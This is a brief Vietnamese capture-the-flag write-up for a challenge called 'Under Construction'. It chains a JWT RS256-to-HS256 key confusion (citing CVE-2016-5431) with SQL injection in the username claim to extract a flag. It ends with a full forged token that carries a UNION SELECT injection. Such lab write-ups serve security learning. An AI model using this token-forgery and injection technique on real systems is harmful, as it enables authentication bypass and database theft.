- Tiêu đề: Under Construction
- Nội dung: CVE JWT to SQLi

- Bài này bước 1 phải dựa trên CVE-2016-5431 là convert RS256 qua HS256 dựa trên public key để verify
- Mình lấy được public key ở ngay header jwt khi login vào 
- Đọc source thấy có sqli ở hàm getUser

![Alt text](<../image/37.1.png>)

- Nhưng nếu bạn register với 1 tài khoản để sqli thì sẽ không thể qua được filter 

![Alt text](<../image/37.10.png>)

- Mình đã test thử bypass nhưng không được nên đã nghĩ theo hướng jwt 

![Alt text](<../image/37.2.png>)
![Alt text](<../image/37.3.png>)

- Vì thấy public key và hàm decode có thể verify bằng HS256 (và mình từng gặp dạng convert này rồi) nên đi search thử 

![Alt text](<../image/37.4.png>)

- Dùng jwt_tool theo lệnh trên để sửa lại username của jwt và thành công inject username khác 

![Alt text](<../image/37.5.png>)

- Giờ chỉ đơn giản là UNION SELECT để lấy tên cột bảng và flag 

![Alt text](<../image/37.6.png>)
![Alt text](<../image/37.8.png>)

- Lấy cờ thôi
![Alt text](<../image/37.9.png>)

- Payload chính: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluJyBVTklPTiBTRUxFQ1QgMSx0b3Bfc2VjcmV0X2ZsYWFnLDMgRlJPTSBmbGFnX3N0b3JhZ2UgLS0gYSIsInBrIjoiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTcwNTQ4NzEzMn0.9ZF6y8TEz1C7-yu0z03pswbLv3KKLHNMybSNKMTgi9o

#hackerga2101: